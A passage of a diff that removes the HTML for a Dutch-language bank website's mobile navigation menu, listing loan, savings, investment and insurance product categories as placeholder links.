-                            </a>
-
-                            <button class="menu-button js-top-menu-trigger js-top-menu-interactive"
-                              data-trigger="lenen-woning" aria-expanded="false">
-                              <span class="menu-button__icon icon-office" aria-hidden="true"></span>
-                              Woning<span class="menu-button__arrow icon-chevron-right" aria-hidden="true"></span>
-                            </button>
-
-                            <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                              data-target="lenen-woning" hidden="hidden">
-
-                              <button class="menu-previous js-top-menu-back-all js-top-menu-interactive"
-                                data-back="lenen">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text">Alle categorieën</span>
-                              </button>
-                              <button class="menu-previous js-top-menu-back js-top-menu-interactive"
-                                data-back="lenen-woning">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text"><span class="visually-hidden">Back to
-                                  </span>Lenen</span>
-                              </button>
-                              <p
-                                class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                                Woning</p>
-
-                              <ul data-block="mobile_menu_middle"
-                                class="menu menu--products js-top-menu menu--sub-menu has-no-active-trail">
-
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Hypothecaire lening
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Groene lening
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Renovatielening
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Overbruggingskrediet
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Wederopname hypothecaire lening
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                  <a href="#"
-                                    class="menu-link menu-link--parent-link">
-                                    <span class="menu-link--parent-link__text">Ontdek meer over Woning</span>
-                                    <span class="menu-link--parent-link__icon icon-arrow-right"
-                                      aria-hidden="true"></span>
-                                  </a>
-                                </li>
-
-                              </ul>
-                            </div>
-                          </li>
-                          <li
-                            class="icon icon-car-side menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                            <a href="#"
-                              class="menu-link menu-link--products menu-link--icon">
-                              <span class="menu-link__icon icon-car-side" aria-hidden="true"></span>
-                              <span class="menu-link__text">Mobiliteit</span>
-                            </a>
-
-                            <button class="menu-button js-top-menu-trigger js-top-menu-interactive"
-                              data-trigger="lenen-mobiliteit" aria-expanded="false">
-                              <span class="menu-button__icon icon-car-side" aria-hidden="true"></span>
-                              Mobiliteit<span class="menu-button__arrow icon-chevron-right" aria-hidden="true"></span>
-                            </button>
-
-                            <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                              data-target="lenen-mobiliteit" hidden="hidden">
-
-                              <button class="menu-previous js-top-menu-back-all js-top-menu-interactive"
-                                data-back="lenen">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text">Alle categorieën</span>
-                              </button>
-                              <button class="menu-previous js-top-menu-back js-top-menu-interactive"
-                                data-back="lenen-mobiliteit">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text"><span class="visually-hidden">Back to
-                                  </span>Lenen</span>
-                              </button>
-                              <p
-                                class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                                Mobiliteit</p>
-
-                              <ul data-block="mobile_menu_middle"
-                                class="menu menu--products js-top-menu menu--sub-menu has-no-active-trail">
-
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Autolening
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Fietslening
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Motorlening
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Lening voor mobilhome of caravan
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Lening voor andere voertuigen
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                  <a href="#"
-                                    class="menu-link menu-link--parent-link">
-                                    <span class="menu-link--parent-link__text">Ontdek meer over Mobiliteit</span>
-                                    <span class="menu-link--parent-link__icon icon-arrow-right"
-                                      aria-hidden="true"></span>
-                                  </a>
-                                </li>
-
-                              </ul>
-                            </div>
-                          </li>
-                          <li
-                            class="icon icon-gift menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                            <a href="#"
-                              class="menu-link menu-link--products menu-link--icon">
-                              <span class="menu-link__icon icon-gift" aria-hidden="true"></span>
-                              <span class="menu-link__text">Andere doelen</span>
-                            </a>
-
-                            <button class="menu-button js-top-menu-trigger js-top-menu-interactive"
-                              data-trigger="lenen-andere-doelen" aria-expanded="false">
-                              <span class="menu-button__icon icon-gift" aria-hidden="true"></span>
-                              Andere doelen<span class="menu-button__arrow icon-chevron-right"
-                                aria-hidden="true"></span>
-                            </button>
-
-                            <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                              data-target="lenen-andere-doelen" hidden="hidden">
-
-                              <button class="menu-previous js-top-menu-back-all js-top-menu-interactive"
-                                data-back="lenen">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text">Alle categorieën</span>
-                              </button>
-                              <button class="menu-previous js-top-menu-back js-top-menu-interactive"
-                                data-back="lenen-andere-doelen">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text"><span class="visually-hidden">Back to
-                                  </span>Lenen</span>
-                              </button>
-                              <p
-                                class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                                Andere doelen</p>
-
-                              <ul data-block="mobile_menu_middle"
-                                class="menu menu--products js-top-menu menu--sub-menu has-no-active-trail">
-
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Persoonlijke lening
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Onder nul gaan op uw zichtrekening
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                  <a href="#"
-                                    class="menu-link menu-link--parent-link">
-                                    <span class="menu-link--parent-link__text">Ontdek meer over Andere doelen</span>
-                                    <span class="menu-link--parent-link__icon icon-arrow-right"
-                                      aria-hidden="true"></span>
-                                  </a>
-                                </li>
-
-                              </ul>
-                            </div>
-                          </li>
-
-                          <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                            <a href="#"
-                              class="menu-link menu-link--parent-link">
-                              <span class="menu-link--parent-link__text">Ontdek meer over Lenen</span>
-                              <span class="menu-link--parent-link__icon icon-arrow-right" aria-hidden="true"></span>
-                            </a>
-                          </li>
-                        </ul>
-
-                      </div>
-                    </li>
-                    <li
-                      class="menu-item menu-item--expanded menu-item--ground js-top-menu-ground js-top-menu-interactive">
-                      <a href="#" target="_self"
-                        class="menu-link menu-link--products" data-drupal-link-system-path="taxonomy/term/66">Sparen en
-                        beleggen</a>
-
-                      <button class="menu-button js-top-menu-trigger js-top-menu-interactive"
-                        data-trigger="sparen-en-beleggen" aria-expanded="false">
-                        Sparen en beleggen<span class="menu-button__arrow icon-chevron-right" aria-hidden="true"></span>
-                      </button>
-                      <div class="menu-extended-dropdown menu-extended-dropdown--first js-top-menu-target"
-                        data-target="sparen-en-beleggen" hidden="hidden">
-                        <button class="menu-previous js-top-menu-back-all js-top-menu-interactive"
-                          data-back="sparen-en-beleggen">
-                          <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                          <span class="menu-previous__text">Alle categorieën</span>
-                        </button>
-                        <p class="menu-extended-dropdown__title js-top-menu-interactive">Sparen en beleggen</p>
-                        <ul data-block="mobile_menu_middle"
-                          class="menu menu--products js-top-menu menu--sub-menu has-no-active-trail">
-
-                          <li
-                            class="icon icon-circle-euro menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                            <a href="#"
-                              class="menu-link menu-link--products menu-link--icon">
-                              <span class="menu-link__icon icon-circle-euro" aria-hidden="true"></span>
-                              <span class="menu-link__text">Sparen</span>
-                            </a>
-
-                            <button class="menu-button js-top-menu-trigger js-top-menu-interactive"
-                              data-trigger="sparen-en-beleggen-sparen" aria-expanded="false">
-                              <span class="menu-button__icon icon-circle-euro" aria-hidden="true"></span>
-                              Sparen<span class="menu-button__arrow icon-chevron-right" aria-hidden="true"></span>
-                            </button>
-
-                            <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                              data-target="sparen-en-beleggen-sparen" hidden="hidden">
-
-                              <button class="menu-previous js-top-menu-back-all js-top-menu-interactive"
-                                data-back="sparen-en-beleggen">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text">Alle categorieën</span>
-                              </button>
-                              <button class="menu-previous js-top-menu-back js-top-menu-interactive"
-                                data-back="sparen-en-beleggen-sparen">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text"><span class="visually-hidden">Back to </span>Sparen en
-                                  beleggen</span>
-                              </button>
-                              <p
-                                class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                                Sparen</p>
-
-                              <ul data-block="mobile_menu_middle"
-                                class="menu menu--products js-top-menu menu--sub-menu has-no-active-trail">
-
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Spaarrekeningen vergelijken
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Spaartest
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Info gereglementeerde spaarrekeningen
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Termijnrekeningen
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Huurwaarborgrekening
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                  <a href="#"
-                                    class="menu-link menu-link--parent-link">
-                                    <span class="menu-link--parent-link__text">Ontdek meer over Sparen</span>
-                                    <span class="menu-link--parent-link__icon icon-arrow-right"
-                                      aria-hidden="true"></span>
-                                  </a>
-                                </li>
-
-                              </ul>
-                            </div>
-                          </li>
-                          <li
-                            class="icon icon-chart-simple menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                            <a href="#"
-                              class="menu-link menu-link--products menu-link--icon">
-                              <span class="menu-link__icon icon-chart-simple" aria-hidden="true"></span>
-                              <span class="menu-link__text">Beleggen</span>
-                            </a>
-
-                            <button class="menu-button js-top-menu-trigger js-top-menu-interactive"
-                              data-trigger="sparen-en-beleggen-beleggen" aria-expanded="false">
-                              <span class="menu-button__icon icon-chart-simple" aria-hidden="true"></span>
-                              Beleggen<span class="menu-button__arrow icon-chevron-right" aria-hidden="true"></span>
-                            </button>
-
-                            <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                              data-target="sparen-en-beleggen-beleggen" hidden="hidden">
-
-                              <button class="menu-previous js-top-menu-back-all js-top-menu-interactive"
-                                data-back="sparen-en-beleggen">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text">Alle categorieën</span>
-                              </button>
-                              <button class="menu-previous js-top-menu-back js-top-menu-interactive"
-                                data-back="sparen-en-beleggen-beleggen">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text"><span class="visually-hidden">Back to </span>Sparen en
-                                  beleggen</span>
-                              </button>
-                              <p
-                                class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                                Beleggen</p>
-
-                              <ul data-block="mobile_menu_middle"
-                                class="menu menu--products js-top-menu menu--sub-menu has-no-active-trail">
-
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Starten met beleggen
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Beleggingsadvies
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Beleggingsfondsen
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Simuleer uw belegging
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Beluister onze podcasts over beleggen
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Grote vermogens
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Kasbons
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Fondsen zoeken
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Wat na vervaldag?
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                  <a href="#"
-                                    class="menu-link menu-link--parent-link">
-                                    <span class="menu-link--parent-link__text">Ontdek meer over Beleggen</span>
-                                    <span class="menu-link--parent-link__icon icon-arrow-right"
-                                      aria-hidden="true"></span>
-                                  </a>
-                                </li>
-
-                              </ul>
-                            </div>
-                          </li>
-                          <li
-                            class="icon icon-briefcase menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                            <a href="#"
-                              class="menu-link menu-link--products menu-link--icon">
-                              <span class="menu-link__icon icon-briefcase" aria-hidden="true"></span>
-                              <span class="menu-link__text">Fiscaal sparen</span>
-                            </a>
-
-                            <button class="menu-button js-top-menu-trigger js-top-menu-interactive"
-                              data-trigger="sparen-en-beleggen-fiscaal-sparen" aria-expanded="false">
-                              <span class="menu-button__icon icon-briefcase" aria-hidden="true"></span>
-                              Fiscaal sparen<span class="menu-button__arrow icon-chevron-right"
-                                aria-hidden="true"></span>
-                            </button>
-
-                            <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                              data-target="sparen-en-beleggen-fiscaal-sparen" hidden="hidden">
-
-                              <button class="menu-previous js-top-menu-back-all js-top-menu-interactive"
-                                data-back="sparen-en-beleggen">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text">Alle categorieën</span>
-                              </button>
-                              <button class="menu-previous js-top-menu-back js-top-menu-interactive"
-                                data-back="sparen-en-beleggen-fiscaal-sparen">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text"><span class="visually-hidden">Back to </span>Sparen en
-                                  beleggen</span>
-                              </button>
-                              <p
-                                class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                                Fiscaal sparen</p>
-
-                              <ul data-block="mobile_menu_middle"
-                                class="menu menu--products js-top-menu menu--sub-menu has-no-active-trail">
-
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Pensioensparen
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Langetermijnsparen
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                  <a href="#"
-                                    class="menu-link menu-link--parent-link">
-                                    <span class="menu-link--parent-link__text">Ontdek meer over Fiscaal sparen</span>
-                                    <span class="menu-link--parent-link__icon icon-arrow-right"
-                                      aria-hidden="true"></span>
-                                  </a>
-                                </li>
-
-                              </ul>
-                            </div>
-                          </li>
-
-                          <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                            <a href="#"
-                              class="menu-link menu-link--parent-link">
-                              <span class="menu-link--parent-link__text">Ontdek meer over Sparen en beleggen</span>
-                              <span class="menu-link--parent-link__icon icon-arrow-right" aria-hidden="true"></span>
-                            </a>
-                          </li>
-                        </ul>
-
-                      </div>
-                    </li>
-                    <li
-                      class="menu-item menu-item--expanded menu-item--ground js-top-menu-ground js-top-menu-interactive">
-                      <a href="#" target="_self"
-                        class="menu-link menu-link--products"
-                        data-drupal-link-system-path="taxonomy/term/68">Verzekeren</a>
-
-                      <button class="menu-button js-top-menu-trigger js-top-menu-interactive" data-trigger="verzekeren"
-                        aria-expanded="false">
-                        Verzekeren<span class="menu-button__arrow icon-chevron-right" aria-hidden="true"></span>
-                      </button>
-                      <div class="menu-extended-dropdown menu-extended-dropdown--first js-top-menu-target"
-                        data-target="verzekeren" hidden="hidden">
-                        <button class="menu-previous js-top-menu-back-all js-top-menu-interactive"
-                          data-back="verzekeren">
-                          <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                          <span class="menu-previous__text">Alle categorieën</span>
-                        </button>
-                        <p class="menu-extended-dropdown__title js-top-menu-interactive">Verzekeren</p>
-                        <ul data-block="mobile_menu_middle"
-                          class="menu menu--products js-top-menu menu--sub-menu has-no-active-trail">
-
-                          <li
-                            class="icon icon-office menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                            <a href="#"
-                              class="menu-link menu-link--products menu-link--icon">
-                              <span class="menu-link__icon icon-office" aria-hidden="true"></span>
-                              <span class="menu-link__text">Woning</span>
-                            </a>
-
-                            <button class="menu-button js-top-menu-trigger js-top-menu-interactive"
-                              data-trigger="verzekeren-woning" aria-expanded="false">
-                              <span class="menu-button__icon icon-office" aria-hidden="true"></span>
-                              Woning<span class="menu-button__arrow icon-chevron-right" aria-hidden="true"></span>
-                            </button>
-
-                            <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                              data-target="verzekeren-woning" hidden="hidden">
-
-                              <button class="menu-previous js-top-menu-back-all js-top-menu-interactive"
-                                data-back="verzekeren">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text">Alle categorieën</span>
-                              </button>
-                              <button class="menu-previous js-top-menu-back js-top-menu-interactive"
-                                data-back="verzekeren-woning">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text"><span class="visually-hidden">Back to
-                                  </span>Verzekeren</span>
-                              </button>
-                              <p
-                                class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                                Woning</p>
-
-                              <ul data-block="mobile_menu_middle"
-                                class="menu menu--products js-top-menu menu--sub-menu has-no-active-trail">
-
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Woonverzekering
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Schuldsaldoverzekering
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                  <a href="#"
-                                    class="menu-link menu-link--parent-link">
-                                    <span class="menu-link--parent-link__text">Ontdek meer over Woning</span>
-                                    <span class="menu-link--parent-link__icon icon-arrow-right"
-                                      aria-hidden="true"></span>
-                                  </a>
-                                </li>
-
-                              </ul>
-                            </div>
-                          </li>
-                          <li
-                            class="icon icon-car-side menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                            <a href="#"
-                              class="menu-link menu-link--products menu-link--icon">
-                              <span class="menu-link__icon icon-car-side" aria-hidden="true"></span>
-                              <span class="menu-link__text">Mobiliteit</span>
-                            </a>
-
-                            <button class="menu-button js-top-menu-trigger js-top-menu-interactive"
-                              data-trigger="verzekeren-mobiliteit" aria-expanded="false">
-                              <span class="menu-button__icon icon-car-side" aria-hidden="true"></span>
-                              Mobiliteit<span class="menu-button__arrow icon-chevron-right" aria-hidden="true"></span>
-                            </button>
-
-                            <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                              data-target="verzekeren-mobiliteit" hidden="hidden">
-
-                              <button class="menu-previous js-top-menu-back-all js-top-menu-interactive"
-                                data-back="verzekeren">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text">Alle categorieën</span>
-                              </button>
-                              <button class="menu-previous js-top-menu-back js-top-menu-interactive"
-                                data-back="verzekeren-mobiliteit">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text"><span class="visually-hidden">Back to
-                                  </span>Verzekeren</span>
-                              </button>
-                              <p
-                                class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                                Mobiliteit</p>
-
-                              <ul data-block="mobile_menu_middle"
-                                class="menu menu--products js-top-menu menu--sub-menu has-no-active-trail">
-
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Autoverzekering
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Fietsverzekering
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Reisverzekering
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Students Travel verzekering
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                  <a href="#"
-                                    class="menu-link menu-link--parent-link">
-                                    <span class="menu-link--parent-link__text">Ontdek meer over Mobiliteit</span>
-                                    <span class="menu-link--parent-link__icon icon-arrow-right"
-                                      aria-hidden="true"></span>
-                                  </a>
-                                </li>
-
-                              </ul>
-                            </div>
-                          </li>
-                          <li
-                            class="icon icon-user-group menu-item menu-item--expanded menu-item--level-1 icon--replaced js-top-menu-interactive">
-                            <a href="#"
-                              class="menu-link menu-link--products menu-link--icon">
-                              <span class="menu-link__icon icon-user-group" aria-hidden="true"></span>
-                              <span class="menu-link__text">Gezin</span>
-                            </a>
-
-                            <button class="menu-button js-top-menu-trigger js-top-menu-interactive"
-                              data-trigger="verzekeren-gezin" aria-expanded="false">
-                              <span class="menu-button__icon icon-user-group" aria-hidden="true"></span>
-                              Gezin<span class="menu-button__arrow icon-chevron-right" aria-hidden="true"></span>
-                            </button>
-
-                            <div class="menu-extended-dropdown menu-extended-dropdown--second js-top-menu-target"
-                              data-target="verzekeren-gezin" hidden="hidden">
-
-                              <button class="menu-previous js-top-menu-back-all js-top-menu-interactive"
-                                data-back="verzekeren">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text">Alle categorieën</span>
-                              </button>
-                              <button class="menu-previous js-top-menu-back js-top-menu-interactive"
-                                data-back="verzekeren-gezin">
-                                <span class="menu-previous__arrow icon-arrow-left" aria-hidden="true"></span>
-                                <span class="menu-previous__text"><span class="visually-hidden">Back to
-                                  </span>Verzekeren</span>
-                              </button>
-                              <p
-                                class="menu-extended-dropdown__title menu-extended-dropdown__title--sub-title js-top-menu-interactive">
-                                Gezin</p>
-
-                              <ul data-block="mobile_menu_middle"
-                                class="menu menu--products js-top-menu menu--sub-menu has-no-active-trail">
-
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Familiale verzekering
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--level-2 js-top-menu-interactive">
-                                  <a href="#"
-                                    class="menu-link menu-link--products menu-link--icon">
-                                    <span class="menu-link__icon icon-chevron-right" aria-hidden="true"></span>
-                                    Ongevallen Privéleven verzekering
-                                  </a>
-                                </li>
-                                <li class="menu-item menu-item--parent-link icon js-top-menu-parent-link">
-                                  <a href="#"
-                                    class="menu-link menu-link--parent-link">
-                                    <span class="menu-link--parent-link__text">Ontdek meer over Gezin</span>
-                                    <span class="menu-link--parent-link__icon icon-arrow-right"
-                                      aria-hidden="true"></span>
-                                  </a>
-                                </li>
-
-                              </ul>
-                            </div>
-                          </li>
-                          <li
-                            class="icon icon-hart menu-item menu-item--level-1 icon--replaced js-top-menu-interactive">
-                            <a href="#"
-                              class="menu-link menu-link--products menu-link--icon">
-                              <span class="menu-link__icon icon-hart" aria-hidden="true"></span>
-                              <span class="menu-link__text">Leven</span>
-                            </a>
-
-                            <button class="menu-button js-top-menu-trigger js-top-menu-interactive"
-                              data-trigger="verzekeren-leven" aria-expanded="false">
-                              <span class="menu-button__icon icon-hart" aria-hidden="true"></span>
